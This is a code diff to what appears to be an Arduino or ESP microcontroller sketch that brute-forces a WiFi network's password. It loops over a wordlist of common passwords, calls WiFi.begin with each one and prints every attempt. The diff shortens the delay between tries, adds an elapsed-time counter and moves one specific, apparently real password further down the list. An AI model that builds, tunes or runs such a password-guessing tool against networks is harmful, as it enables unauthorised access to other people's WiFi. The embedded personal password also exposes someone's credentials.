@@ -6,7 +6,6 @@ char* password = "password"; //Enter Password
 char strValue[10];
 
 char *passwords[] = {
-"arun&emmaly",
 "password",
 "123456",
 "12345678",
@@ -17,6 +16,7 @@ char *passwords[] = {
 "pussy",
 "baseball",
 "football",
+"arun&emmaly",
 "letmein",
 "monkey",
 "696969",
@@ -1039,11 +1039,14 @@ void setup(void)
     Serial.print(": ");
     Serial.print(password);
     Serial.print('\n');
+    Serial.print("seconds elapsed: ");
+    Serial.print(seconds);
+    Serial.print('\n');
     itNum++;
     
     WiFi.begin(ssid, password); //eventually, you will have to add an identifier, for example, in serial event, check if ch is # and if so, assume it is the ssid
-    delay(18000);
-    seconds += 20;
+    delay(16850);
+    seconds += 17;
   }
   Serial.print('\n');
   Serial.print("WiFi connection Successful, taking about ");
